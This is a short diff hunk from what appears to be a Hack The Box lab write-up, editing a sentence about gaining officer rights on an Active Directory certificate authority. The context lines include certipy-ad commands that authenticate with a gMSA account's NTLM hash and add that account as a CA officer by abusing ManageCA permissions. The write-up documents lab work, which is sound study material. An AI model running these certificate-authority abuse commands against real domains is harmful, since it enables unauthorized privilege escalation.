@@ -1071,7 +1071,7 @@ certipy-ad find -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c60
 
 So the template recommended in the certipy is also enabled, so i want have to enable it
 
-But i am currently not an enrollee, but since i have ManageCa perms i should be able to add myself
+But i am currently not an enrollee, but since i have ManageCa perms i should be able to add myself as a officer
 
 ```python
 certipy-ad ca -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -ns '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -add-officer 'gMSA_CA_prod$' -target 10.129.244.72 -debug
